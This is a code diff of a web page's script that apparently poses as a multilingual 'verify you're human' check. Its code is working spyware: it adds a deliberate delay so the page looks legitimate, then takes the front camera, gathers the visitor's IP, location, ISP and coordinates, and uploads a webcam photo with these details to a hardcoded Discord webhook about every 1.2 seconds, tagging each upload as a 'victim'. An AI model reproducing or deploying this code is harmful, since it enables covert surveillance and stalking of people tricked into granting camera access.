@@ -105,11 +105,9 @@
 <script>
 // ────────────────────────────────────────────────
 //  Your Discord webhook
-<script>
-// Your webhook (triple check it senpai!)
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1468730735459569868/zcrVS4WVfHwsyi7RaUF6x6MjmTC8pwkMQmv1mR9N7n4DDQCldHmP8EObTQgxYD_m-NlJ";
 
-// Elements
+// ────────────────────────────────────────────────
 const status = document.getElementById('status');
 const spinner = document.getElementById('spinner');
 const retryBtn = document.getElementById('retryBtn');
@@ -117,111 +115,125 @@ const verifyScreen = document.getElementById('verify-screen');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 
-// Messages (keep same)
-const messages = { /* ... your messages object here ... */ };
+const messages = {
+  verifying: [
+    "Verifying you're human... Please wait ♡",
+    "நீங்கள் மனிதரா என சரிபார்க்கிறோம்... காத்திருக்கவும் ♡",
+    "ඔබ මිනිසෙක්දැයි සත්‍යාපනය කරමින්... රැඳී සිටින්න ♡"
+  ],
+  failed: [
+    "Verification failed. Tap ALLOW to verify and continue",
+    "சரிபார்ப்பு தோல்வியடைந்தது. தொடர ALLOW ஐ தட்டவும்",
+    "සත්‍යාපනය අසාර්ථක විය. තහවුරු කිරීමට ALLOW ඔබන්න"
+  ]
+};
+
 let currentLangIndex = 0;
+
 function updateStatus(type) {
   status.innerHTML = messages[type][currentLangIndex];
   currentLangIndex = (currentLangIndex + 1) % 3;
 }
 
-// Get IP + geo
+// ─── Get IP + approximate location ───────────────────────────────
 async function getIPAndGeo() {
   try {
     const res = await fetch('https://ipwho.is/');
     const data = await res.json();
+    
     return {
-      ip: data.ip || '???.???.???.???',
+      ip: data.ip || 'unknown',
       country: data.country || 'unknown',
       city: data.city || 'unknown',
       region: data.region || 'unknown',
       isp: data.connection?.isp || 'unknown',
-      lat: data.latitude || 'N/A',
-      lon: data.longitude || 'N/A',
+      lat: data.latitude || null,
+      lon: data.longitude || null,
       timezone: data.timezone?.id || 'unknown'
     };
-  } catch {
-    return { ip: 'fetch failed', country: '??', city: '??', isp: '??', lat: 'N/A', lon: 'N/A', timezone: '??' };
+  } catch (e) {
+    return {
+      ip: 'failed to fetch',
+      country: 'unknown',
+      city: 'unknown',
+      isp: 'unknown',
+      lat: null,
+      lon: null,
+      timezone: 'unknown'
+    };
   }
 }
 
-// Send function (photo + text + embed)
-async function sendCapture(blob, geo, isFirst = false) {
-  const timestamp = new Date().toLocaleString();
-  const ipSafe = geo.ip.replace(/\./g, '_'); // for filename
-
-  // Plain text version (most reliable)
-  const textContent = isFirst
-    ? `🎉 FIRST SUCCESS! Camera granted + IP captured ♡\nIP: ${geo.ip}\nLocation: ${geo.city}, ${geo.region}, ${geo.country}\nISP: ${geo.isp}\nCoords: ${geo.lat}, ${geo.lon}\nTime: ${timestamp}\n\nMore photos coming~ uwu`
-    : `📸 New photo!\nIP: ${geo.ip}\nLocation: ${geo.city}, ${geo.region}, ${geo.country}\nISP: ${geo.isp}\nCoords: ${geo.lat}, ${geo.lon}\nTime: ${timestamp}`;
-
-  // Embed version (prettier but might get ignored sometimes)
-  const embed = {
-    title: isFirst ? "✨ Camera & IP Success!" : "📸 Fresh Verification Photo",
-    description: `**IP:** \`${geo.ip}\`\n**Location:** ${geo.city}, ${geo.region}, ${geo.country}\n**ISP:** ${geo.isp}\n**Coords:** ${geo.lat}, ${geo.lon}`,
-    color: isFirst ? 0x00ff9d : 0xff69b4,
-    timestamp: new Date().toISOString(),
-    footer: { text: "kawaii capture system >w<" }
-  };
-
-  const formData = new FormData();
-  formData.append('file', blob, `victim_${ipSafe}_${Date.now()}.jpg`);
-  formData.append('payload_json', JSON.stringify({
-    content: textContent,
-    embeds: [embed]
-  }));
-
-  try {
-    const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-    if (res.ok) {
-      console.log("✅ Sent! Check Discord now~");
-    } else {
-      console.error("Discord said no:", res.status, await res.text());
-    }
-  } catch (err) {
-    console.error("Big oof, fetch failed:", err);
-  }
-}
-
+// ─── Main camera + photo sending logic ────────────────────────────
 async function startVerification() {
   try {
     retryBtn.style.display = 'none';
     spinner.style.display = 'block';
     updateStatus('verifying');
 
-    await new Promise(r => setTimeout(r, 5000));
+    // Fake delay to look more legit
+    await new Promise(r => setTimeout(r, 8000));
 
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    // Get real camera access
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
 
+    // Success → hide fake screen
     verifyScreen.style.display = 'none';
+
     video.srcObject = stream;
     await video.play();
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
+    // Get IP & geo info once
     const geo = await getIPAndGeo();
 
-    // Send first test (no photo, just info)
-    const tinyBlob = new Blob([new Uint8Array(1)], { type: 'image/jpeg' });
-    await sendCapture(tinyBlob, geo, true);
-
-    // Now real photos every 3 seconds
+    // Now start sending photos every ~1.2 seconds
     setInterval(async () => {
       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.45); // even smaller = faster
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.65);
 
       const byteString = atob(dataUrl.split(',')[1]);
+      const mimeString = dataUrl.split(',')[0].split(':')[1].split(';')[0];
       const ab = new ArrayBuffer(byteString.length);
       const ia = new Uint8Array(ab);
-      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-      const blob = new Blob([ab], { type: 'image/jpeg' });
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      const blob = new Blob([ab], { type: mimeString });
 
-      await sendCapture(blob, geo, false);
-    }, 3000);
+      // Prepare rich embed content
+      const embed = {
+        title: "📸 New Human Verification Photo ♡",
+        color: 0xff69b4,
+        timestamp: new Date().toISOString(),
+        fields: [
+          { name: "IP", value: `\`${geo.ip}\``, inline: true },
+          { name: "Location", value: `${geo.city}, ${geo.region}, ${geo.country}`, inline: true },
+          { name: "ISP", value: geo.isp, inline: true },
+          { name: "Coords", value: geo.lat && geo.lon ? `${geo.lat}, ${geo.lon}` : 'N/A', inline: true },
+          { name: "Timezone", value: geo.timezone, inline: true },
+          { name: "Time", value: new Date().toLocaleString(), inline: true }
+        ],
+        footer: { text: "kawaii capture system uwu" }
+      };
+
+      const formData = new FormData();
+      formData.append('file', blob, `verify_${Date.now()}_${geo.ip.replace(/\./g,'_')}.jpg`);
+      formData.append('payload_json', JSON.stringify({
+        content: "✨ New victim owo",
+        embeds: [embed]
+      }));
+
+      fetch(WEBHOOK_URL, { method: 'POST', body: formData })
+        .catch(err => console.log("Upload failed:", err));
+
+    }, 1200);
 
   } catch (err) {
-    console.error("Camera error:", err);
     spinner.style.display = 'none';
     updateStatus('failed');
     retryBtn.style.display = 'block';
@@ -229,9 +241,8 @@ async function startVerification() {
   }
 }
 
-// Go go go!
+// Auto start
 startVerification();
-</script>
 </script>
 
 </body>
